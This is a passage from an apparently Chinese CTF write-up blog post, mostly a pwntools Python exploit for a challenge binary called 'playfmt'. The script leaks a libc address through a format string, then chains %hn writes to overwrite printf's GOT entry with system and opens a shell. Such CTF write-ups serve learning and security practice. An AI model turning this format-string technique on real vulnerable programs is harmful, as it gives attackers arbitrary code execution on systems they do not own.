class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./playfmt\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./playfmt\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">\"%15$paaaa\"</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">addr = int(p.recvuntil(<span class=\"string\">\"aaaa\"</span>).split(<span class=\"string\">'aaaa'</span>)[<span class=\"number\">0</span>].split(<span class=\"string\">\"\\n\"</span>)[<span class=\"number\">-1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'__libc_start_main'</span>] - <span class=\"number\">247</span></span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\">printfgot = elf.got[<span class=\"string\">'printf'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">\"%6$x\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">ebp2 = int(<span class=\"string\">\"0x\"</span> + p.recvline().strip(), <span class=\"number\">16</span>)</span><br><span class=\"line\">ebp1 = ebp2 - <span class=\"number\">0x10</span></span><br><span class=\"line\">nop2 = ebp2 + <span class=\"number\">0x4</span></span><br><span class=\"line\">nop1 = ebp2 - <span class=\"number\">0xc</span> </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [ebp2] = nop1</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(nop1 &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%6$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [nop1] = printgot</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(printfgot &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%10$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [ebp2] = nop2</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(nop2 &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%6$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [nop2] = printgot + 2</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str((printfgot + <span class=\"number\">2</span>) &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%10$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># [printgot] = system</span></span><br><span class=\"line\">payload = <span class=\"string\">\"%\"</span> + str(system &gt;&gt; <span class=\"number\">16</span> &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%11$hn\"</span> + <span class=\"string\">\"%\"</span> + str(((system &amp; <span class=\"number\">0xffff</span>) - (system &gt;&gt; <span class=\"number\">16</span> &amp; <span class=\"number\">0xffff</span>)) &amp; <span class=\"number\">0xffff</span>) + <span class=\"string\">\"c%7$hn\"</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<hr>\n<p>本篇到此为止，接下来是glibc heap exploit的题解。</p>\n","categories":[],"tags":[{"name":"pwn","slug":"pwn","count":3,"path":"api/tags/pwn.json"}]}